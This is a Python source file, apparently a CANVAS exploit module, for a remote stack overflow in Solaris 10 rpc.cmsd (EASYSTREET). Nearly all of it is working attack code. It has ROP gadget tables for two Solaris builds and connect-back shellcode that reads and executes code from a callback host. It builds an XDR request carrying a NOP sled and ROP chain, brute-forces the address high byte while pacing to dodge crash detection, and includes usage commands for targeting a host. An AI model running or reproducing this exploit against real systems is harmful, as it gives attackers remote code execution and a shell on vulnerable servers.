#!/usr/bin/env python

import sys

if '.' not in sys.path:
    sys.path.append('.')

import os
import copy
import time
import socket
import select
import errno
import struct
import random
import logging

import subprocess
import random
import xdrlib

import select

from sunrpc import *

NAME                            = 'Solaris RPC CMSD - Remote Stack Overflow'
DESCRIPTION                     = 'Remote stack overflow within cmsd (aka EASYSTREET)'
VERSION                         = '0.1'

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Oracle'
DOCUMENTATION['Date public']    = ''
DOCUMENTATION['Repeatability']  = 'Unlimited'
DOCUMENTATION["CVE Name"]       = "N/A"
DOCUMENTATION["CVE Url"]        = "N/A"
DOCUMENTATION['CVSS']           = 10.0
DOCUMENTATION["References"]     = "https://github.com/x0rz/EQGRP/blob/master/README.md"

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Remote'
PROPERTY["ARCH"]                = [ ["Solaris"] ]
PROPERTY["VERSION"]             = [ "10" ]

CHANGELOG = """
"""

NOTES = """
Confirmed working against:
    - Solaris 10 x86 u11
    - Solaris 10 x86 u3

In the CEU version, gcc and its libraries must be installed.

If you are on a 64 bit machine, you must install 32-bit C development
headers. On Ubuntu 16.04 LTS, all of the above can be accomplished via:

sudo apt-get install build-essential gcc libc6-dev-i386

To get a node:
./commandlineInterface.py -v 12 -p 5555
./exploits/remote/unix/solaris_rpc_cmsd/solaris_rpc_cmsd.py -t 192.168.1.185 -l 192.168.1.186 -d 5555
"""

DEVNOTES = """
"""

from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
from shellcode import shellcodeGenerator
from solarisNode import solarisNode
import solarisMosdefShellServer

from MOSDEF import mosdef
from encoder.chunkedaddencoder import intelchunkedaddencoder

from libs import rpc
from libs.newsmb.Struct import Struct


solaris_10u11_gadgets = {"bases": {"libc_base": "mask | 0x00d70000"},
                          # libc : pop eax ; ret
                          "set_source": {"var_name": "set_source",
                                    "expr": "libc_base + 0x32753",
                                    "arg_fixup": None},
                          # libc : pop eax ; ret
                          "set_dest": {"var_name": "set_dest",
                              "expr": "libc_base + 0x73cab",
                              "arg_fixup": "ARG-4"},
                          # libc : mov dword ptr [eax + 4], ecx ;
                          # ret
                          "write": {"var_name": "write",
                                    "expr": "libc_base + 0x25a6a",
                                    "arg_fixup": None},
                          "rwx_start": "libc_base + 0x00118114"}

solaris_10u3_gadgets = {"bases": {"libc_base": "mask | 0x00df0000",
                                  "ld_base": "mask | 0x00fca000"},
                        # rpc.cmsd: 0x0805a62c : pop edx ; pop ebp ; ret
                        "set_source": {"var_name": "set_dest",
                                     "expr": "0x0805a62c",
                                     "arg_fixup": None,
                                     "stack_adjust": 4,
                        },
                        # libc: pop eax ; ret
                        "set_dest": {"var_name": "set_source",
                                       "expr": "libc_base + 0x0007dc12",
                                       "arg_fixup": None},
                        # ld: mov dword ptr [eax], edx ;
                        # mov eax, 0xffffffff ; xor edx, edx ; ret
                        "write":{"var_name": "write",
                                 "expr": "ld_base + 0x0001c9b1",
                                 "arg_fixup": None},
                        "rwx_start":"0x80a4020"}

def swap(idx_one, idx_two, collection):
    temp = collection[idx_two]
    collection[idx_two] = collection[idx_one]
    collection[idx_one] = temp

class CMSDStructure(object):
    pass

def cmsd_packer(obj, packer=None):
    assert (isinstance(obj, CMSDStructure))
    return obj.pack(obj.packer)

class CMSAttrReminderValue(CMSDStructure):
    def __init__(self):
        self.value_type = 13
        self.reminder_data = None
        self.lead_time = None
        self.snooze_time = None
        self.repeat_count = None
        self.reminder_data_size = None
        self.reminder_data = None
        self.packer = None

    def pack(self, packer=None):
        """
        struct cmsd_attr_value {
           int     type;
           union {
               struct cmsd_reminder    *reminder_value;
           } item;
        }
        """
        packer.pack_int(self.value_type)
        # pointer to struct cmsd_reminder
        packer.pack_uint(1)
        """
        struct cmsd_reminder {
           char * lead_time;
           char * snooze_time;
           unsigned long   repeat_count;
           Unsigned int    reminder_data_size;
           unsigned char * reminder_data;
        };
        """
        # start cmsd_reminder
        packer.pack_string(self.lead_time)
        packer.pack_string(self.snooze_time)
        packer.pack_uint(self.repeat_count)
        packer.pack_string(self.reminder_data)

class CMSAttribute(CMSDStructure):
    def __init__(self):
        self.name_ident = None
        self.name = None
        self.value = None
        self.packer = None

    def pack(self, packer=None):
        assert isinstance(self.value, CMSDStructure)

        """
        struct cmsd_attr {
           short name_ident;
           char * name;
           struct cmsd_attr_value *value;
        };
        """

        packer.pack_uint(self.name_ident)
        packer.pack_string(self.name)
        # pointer to cmsd_attr_value
        packer.pack_uint(1)
        self.value.pack(packer)


class CMSCreateArgs(CMSDStructure):
    def __init__(self):
        self.calendar_name = None
        self.calendar_char_set = None
        self.pid = None
        self.count_attrs = None
        self.attrs = None
        self.packer = None
        # assert (isinstance(self.attrs, seq))

    def pack(self, packer=None):
        """
        struct cms_create_args {
           char * calendar_name;
           char * calendar_char_set;
           int pid;
           u_int count_attrs;
           struct cmsd_attr *attrs;
        };
        """
        packer.pack_string(self.calendar_name)
        packer.pack_string(self.calendar_char_set)
        packer.pack_int(self.pid)
        packer.pack_uint(self.count_attrs)

        self.attrs[0].pack(packer)



class theexploit(tcpexploit):

    def __init__(self, getsock=None):
        tcpexploit.__init__(self)
        self.name               = NAME
        self.host               = '127.0.0.1'
        self.port               = 0
        self.debug              = False
        self.binary_succeeded   = False
        self.fastcheck = True
        return

    def neededListenerTypes(self):
        return [canvasengine.SOLARISMOSDEF_INTEL]

    def get_args(self):
        self.target_version = self.argsDict.get("radiobutton1_value",
                                                "Solaris 10u11")
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        self.debug = bool(self.argsDict.get('debug', self.debug))
        return

    def get_shellcode(self, ip, port, debug=False):
        sc = shellcodeGenerator.solaris_X86()
        sc.addAttr("connect", {"port":port,
                               "ipaddress":ip,
                               "syscallType": 2})
        sc.addAttr("read_and_exec", {"fdreg": 'esi',
                                     "syscallType": 2})

        encoder = intelchunkedaddencoder()
        encoder.setbadstring("\x00")

        shellcode = sc.get()
        fixup = mosdef.assemble("movl %esp, %ebx", "X86")
        pre_pad_sc = fixup + shellcode
        final_sc = pre_pad_sc + ("\x41" * (4 - (len(pre_pad_sc) % 4)))
        debug_prefix = "\x41\x41\x41\xcc" if debug else ""
        payload =  encoder.encode(debug_prefix + final_sc)

        return payload

    def get_python_rop_chain(self, shellcode, gadgets, high_byte, egg="\x41\x42\x43\x44"):
        assert "set_source" in gadgets
        assert "set_dest" in gadgets
        assert "write" in gadgets
        assert "rwx_start" in gadgets
        assert "bases" in gadgets

        bootstrap = """
        movl %esp, %eax
        a:
        movl (%eax), %ebx
        cmp $0xEGG_08X, %ebx
        jne b
        jmp c
        b:
        incl %eax
        jmp a
        c:
        xorl %ecx, %ecx
        xor $0xXOR_LEN_08X, %ecx
        xor $0xffffffff, %ecx
        popl %edi
        movl %eax, %esi
        rep movsb
        popl %edi
        jmp %edi
        """.replace("EGG_08X","%08x" % (struct.unpack("<L", egg)[0])).replace("XOR_LEN_08X", "%08x" % (0xffffffff ^ (len(shellcode) + (len(shellcode) % 4))))

        code = mosdef.assemble(bootstrap, "X86")

        if (len(code) % 4) != 0:
            code += "\x41" * (4 - (len(code) % 4))

        shellcode = egg + shellcode
        if (len(shellcode) % 4) != 0:
            shellcode += "\x41" * (4 - (len(shellcode) % 4))

        rop_chain = []
        mask = high_byte << 24

        for (name, expr) in gadgets["bases"].iteritems():
            exec ("%s = %s" % (name, eval(expr)))

        variables = ["set_source", "set_dest", "write"]
        for variable in variables:
            exec ("%s = %s" % (gadgets[variable]["var_name"], eval(gadgets[variable]["expr"])))

        rop_chain = []
        # ebp overwrite
        rop_chain.append(struct.pack("<L", 0x41424354))

        for i in range(0, len(code), 4):
            args = ["0x%08x" %  struct.unpack("<L", code[i:i+4])[0], # source
                    gadgets["rwx_start"] + "+%d" % (i),# bootstrap dest
                    None]

            for (variable, arg) in zip(variables, args):
                expr = gadgets[variable]["expr"]
                arg_fixup = gadgets[variable].get("arg_fixup")
                stack_adjust = gadgets[variable].get("stack_adjust")
                final_arg = arg

                if arg_fixup is not None:
                    final_arg = arg_fixup.replace("ARG",arg)

                rop_chain.append(struct.pack("<L", eval(expr)))

                if arg:
                    rop_chain.append(struct.pack("<L", eval(final_arg)))

                if stack_adjust is not None:
                    for i in range(0, stack_adjust, 4):
                        rop_chain.append(struct.pack("<L", 0x51525354))

        # ensure we return to the right place
        rop_chain.append(struct.pack("<L", eval(gadgets["rwx_start"])))

        # ensure we write to the right place
        rop_chain.append(struct.pack("<L", eval(gadgets["rwx_start"] + "+ 0x100")))
        # ensure we execute the written shellcode
        rop_chain.append(struct.pack("<L", eval(gadgets["rwx_start"] + "+ 0x100")))

        for i in range(0, len(shellcode),4):
            block = shellcode[i:i+4]

            rop_chain.append(block)

        return "".join(rop_chain)



    def get_rop_chain(self, shellcode, gadgets, version, out_type="c", egg="\x41\x42\x43\x44"):
        assert "set_source" in gadgets
        assert "set_dest" in gadgets
        assert "write" in gadgets
        assert "rwx_start" in gadgets
        assert "bases" in gadgets

        bootstrap = """
        movl %esp, %eax
        a:
        movl (%eax), %ebx
        cmp $0xEGG_08X, %ebx
        jne b
        jmp c
        b:
        incl %eax
        jmp a
        c:
        xorl %ecx, %ecx
        xor $0xXOR_LEN_08X, %ecx
        xor $0xffffffff, %ecx
        popl %edi
        movl %eax, %esi
        rep movsb
        popl %edi
        jmp %edi
        """.replace("EGG_08X","%08x" % (struct.unpack("<L", egg)[0])).replace("XOR_LEN_08X", "%08x" % (0xffffffff ^ (len(shellcode) + (len(shellcode) % 4))))

        code = mosdef.assemble(bootstrap, "X86")

        if (len(code) % 4) != 0:
            code += "\x41" * (4 - (len(code) % 4))

        shellcode = egg + shellcode
        if (len(shellcode) % 4) != 0:
            shellcode += "\x41" * (4 - (len(shellcode) % 4))

        rop_c_code = []

        if self.fastcheck:
            rop_c_code.append("xx=%s;" % ("0xfe" if version.endswith("10u11") else "0xd1"))

        rop_c_code.append("uint32_t mask         = xx << 24;")
        for (name, expr) in gadgets["bases"].iteritems():
            rop_c_code.append("unsigned int %s = %s;" % (name, expr))

        variables = ["set_source", "set_dest", "write"]
        for variable in variables:
            rop_c_code.append("unsigned int %s = %s;" % (gadgets[variable]["var_name"], gadgets[variable]["expr"]))
        rop_chain = []
        # ebp overwrite
        rop_chain.append("0x41424354")
        for i in range(0, len(code), 4):
            args = ["0x%08x" %  struct.unpack("<L", code[i:i+4])[0], # source
                    gadgets["rwx_start"] + "+%d" % (i),                            # dest
                    None]

            for (variable, arg) in zip(variables, args):
                expr = gadgets[variable]["expr"]
                arg_fixup = gadgets[variable].get("arg_fixup")
                stack_adjust = gadgets[variable].get("stack_adjust")
                final_arg = arg

                if arg_fixup is not None:
                    final_arg = arg_fixup.replace("ARG",arg)

                rop_chain.append(expr)

                if arg:
                    rop_chain.append(final_arg)

                if stack_adjust is not None:
                    for i in range(0, stack_adjust, 4):
                        rop_chain.append("0x51525354")

        # ensure we return to the right place
        rop_chain.append(gadgets["rwx_start"])

        # ensure we write to the right place
        rop_chain.append(gadgets["rwx_start"] + "+ 0x100")
        # ensure we execute the written shellcode
        rop_chain.append(gadgets["rwx_start"] + "+ 0x100")

        for i in range(0, len(shellcode),4):
            rop_chain.append("0x%08x" % (struct.unpack("<L", shellcode[i:i+4])[0]))

        element_count = 0
        rop_c_code.append("unsigned int rop[] = {")
        for address in rop_chain:
            element_count += 1
            rop_c_code.append(address + ",")
        rop_c_code.append("};")

        rop_c_code.append("for (int i = 0; i < %d; i++){" % (element_count))
        rop_c_code.append("\t*p++ = rop[i];")
        rop_c_code.append("}")

        return "\n".join(rop_c_code)

    def get_c_exploit(self):
        c_path = os.path.join(os.path.dirname(__file__),
                              "Resources", "x.c")
        handle = open(c_path, "rb")
        c_data = handle.read()
        handle.close()

        return c_data

    def compile_exploit(self, c_exploit):
        temp_prefix = "temp_exploit_%d" % random.randint(0,10000)
        temp_c_path = os.path.join(os.path.dirname(__file__),
                                   "Resources",
                                   temp_prefix + ".c")
        temp_exp_path = os.path.join(os.path.dirname(__file__),
                                     "Resources",
                                     temp_prefix)
        with open(temp_c_path, "wb") as handle:
            handle.write(c_exploit)

        retval = subprocess.call(["gcc", "-m32", "-o" + temp_exp_path, temp_c_path])
        success = True

        if retval != 0:
            success = False
            logging.error("error while compiling exploit! exiting...")
            return False
        else:
            return temp_exp_path

    def run_c_exploit(self, shellcode):
        global solaris_10u11_gadgets
        global solaris_10u3_gadgets

        c_exploit = self.get_c_exploit()
        shellcode = self.get_shellcode(self.callback.ip,
                                       self.callback.port)
        gadgets = {"Solaris 10u3": solaris_10u3_gadgets,
                   "Solaris 10u11": solaris_10u11_gadgets}

        rop_chain = self.get_rop_chain(shellcode, gadgets[self.target_version], self.target_version)
        current_exploit = c_exploit.replace("//ROP_CHAIN_INSERTION_POINT", rop_chain)
        exploit_path = self.compile_exploit(current_exploit)
        self.final_exploit_path = exploit_path

        if exploit_path is not None:
            process = subprocess.Popen([exploit_path, self.target.interface, "udp"])
            return process

        return False

    def encode_xdr_data(self, rop_chain):
        args = CMSCreateArgs()
        attribute = CMSAttribute()
        reminder = CMSAttrReminderValue()

        args.calendar_name = "%d@cal" % random.randint(0, 0xffffffff)
        args.calendar_char_set = args.calendar_name
        args.pid = 0
        args.count_attrs = 1

        reminder.reminder_data = ""
        reminder.snooze_time = "\x90"*519 + rop_chain
        reminder.lead_time = "+PT1234S"
        reminder.repeat_count = 2
        reminder.reminder_data_size = 0

        attribute.name = args.calendar_name
        attribute.name_ident = 0xffffffff
        attribute.value = reminder

        args.attrs = [attribute]

        xdr = xdrlib.Packer()

        args.pack(xdr)
        return xdr.get_buffer()

    def test(self):
        self.get_args()

        if int(self.port) == 0:
            res_port = SRPCgetport(self.target.interface,
                                   100068,
                                   5,
                                   "UDP")

            if res_port == 0 or res_port is None:
                logging.error("Unable to discover CMSD port")
                return 0
            else:
                return 1

        return 1

    def cmsd_ping(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((self.host, self.port))
        header = SRPCCallHeaderUDP(100068, 5, 0)
        s.send(header)

        retList = select.select([s], [], [], 2.0)
        if s not in retList[0]:
            logging.warning("CMSD_PING: socket problem")
            return 0

        # our socket has data waiting...
        data = sunrpc_recv_udp(s)
        if len(data) < 24:
            logging.error("CMSD_PING: len of data recv'd < 24")
            return 0

        value = str2bigendian(data[20:24])

        logging.debug("CMSD_PING: got return value: %d" % value)
        if value == 0:
            return 1
        return 0

    def run(self):
        self.get_args()
        self.setProgress(0)
        success = False

        # Get the port for the CMSD service
        if int(self.port) == 0:
            self.port = SRPCgetport(self.target.interface,
                                    100068,
                                    5,
                                    "UDP")
            if self.port == 0 or self.port is None:
                logging.error("Unable to discover CMSD port")
                return 0

            logging.debug("Found CMSD port: " + str(self.port))

        gadget_map = {"Solaris 10u3": solaris_10u3_gadgets,
                      "Solaris 10u11": solaris_10u11_gadgets}

        high_byte_map = {"Solaris 10u3": 0xd1,
                         "Solaris 10u11": 0xfe}

        shellcode = self.get_shellcode(self.callback.ip, self.callback.port)
        progress = 0
        high_byte = high_byte_map[self.target_version]

        # Try the high-byte value we've seen during testing first.
        # Also, since these high-bytes tend to be higher in number,
        # we'll try the list in descending order. All of this is
        # done to help make exploitation faster in practice without
        # compromising the soundness of the exploit.
        high_byte_range = [x for x in range(1, 256)]
        #swap(high_byte-1, len(high_byte_range)-1, high_byte_range)

        # this is the test that proves the CMSD ping loop is enough
        # to ensure we get a shell no matter the order of the correct
        # high return address byte
        # swap(high_byte-1, 30, high_byte_range)

        for (index, high_byte) in enumerate(reversed(high_byte_range)):
            logging.info("Bruteforcing with 0x%x" % high_byte)
            if not self.state.lower().startswith("halt"):
                if index % 8 == 0 and index != 0:
                    logging.info("Attempt (%d) - sleeping 10 seconds to avoid anti-crash" % (index + 1))
                    time.sleep(10)

                alive = False
                alive_checks = 10

                success = False
                while all([(not alive),
                           (alive_checks > 0), not success]):
                    try:
                        alive |= self.cmsd_ping()
                    except:
                        pass

                    alive_checks -= 1
                    success |= bool(self.ISucceeded())

                if not success:
                    if not alive and alive_checks <= 0:
                        logging.error("Target service does not appear to be alive. Exiting")
                        return 0
                else:
                    return 1

            else:
                return 0

            self.port = SRPCgetport(self.target.interface,
                                    100068,
                                    5,
                                    "UDP")
            if self.port == 0 or self.port is None:
                logging.error("Unable to discover CMSD port")
                return 0

            logging.debug("Found CMSD port: " + str(self.port))

            if high_byte % 2 == 0:
                progress += 1
                self.setProgress(progress)

            gadgets = gadget_map[self.target_version]
            rop_chain = self.get_python_rop_chain(shellcode,
                                                  gadgets,
                                                  high_byte)

            evil_request = self.encode_xdr_data(rop_chain)

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.host, self.port))
            header = SRPCCallHeaderUDP_UNIX(100068, 5, 3, "calendar")
            s.send(header + evil_request)
            s.close()

            success = bool(self.ISucceeded())

            if success:
                return True

        logging.warning("Exiting exploit")
        self.setProgress(100)
        return int(success)

    def run_native(self):
        self.get_args()

        if self.debug:
            logger = logging.getLogger()
            logger.setLevel(logging.DEBUG)
        self.setProgress(0)

        shellcode = self.get_shellcode(self.callback.ip, self.callback.port)

        logging.info("Generated and encoded MOSDEF payload")

        success = False

        self.setProgress(25)
        logging.info("Running exploit, might take a while...")
        process = self.run_c_exploit(shellcode)

        logging.info("exploit binary path:" + self.final_exploit_path)

        if process != False:
            while (not self.state.lower().startswith("halt")) and (process.returncode == None):
                success = bool(self.ISucceeded())
                if success:
                    break
            logging.info("Terminating exploit binary")
            process.terminate()
        self.success = success
        self.setProgress(100)

        return int(success)


if __name__ == '__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION))
    app = theexploit()
    try:
        ret = standard_callback_commandline(app)
    except KeyboardInterrupt:
        pass
    if ret not in [0,1,None] and hasattr(ret, 'interact'):
        ret.interact()

